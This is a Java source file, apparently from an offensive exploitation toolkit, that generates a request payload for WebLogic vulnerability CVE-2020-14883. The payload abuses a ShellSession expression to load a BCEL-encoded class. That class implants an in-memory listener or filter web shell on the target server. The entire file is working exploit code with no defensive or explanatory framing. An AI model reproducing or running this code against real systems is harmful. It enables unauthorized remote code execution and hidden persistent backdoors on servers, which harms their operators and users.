package core.payloads;

import core.enumtypes.PayloadType;
import core.memshell.WeblogicFilterMemShell;
import core.memshell.WeblogicListenerMemShell;
import javassist.CtClass;
import utils.Util;


public class Weblogic_CVE_2020_14883 {
    public static Object getObject(PayloadType type, String trojanType) throws Exception {
        byte[] bytecodes = null;
        String payloadTemplate = "nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession('new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"{code}\").newInstance()')";
        switch (type) {
            case weblogiclistenermemshell:
                bytecodes = Util.getClassBytes(WeblogicListenerMemShell.class);
                break;
            case weblogicfiltermemshell:
                bytecodes = Util.getClassBytes(WeblogicFilterMemShell.class);
                break;
        }

        String bcelCodeStr = Util.generateBcelCode2(bytecodes);
        return payloadTemplate.replace("{code}", bcelCodeStr).replace("\n", "");
    }

    public static byte[] getByte(PayloadType type, String trojanType) throws Exception {
        String payload = (String) getObject(type, trojanType);
        return payload.getBytes();
    }
}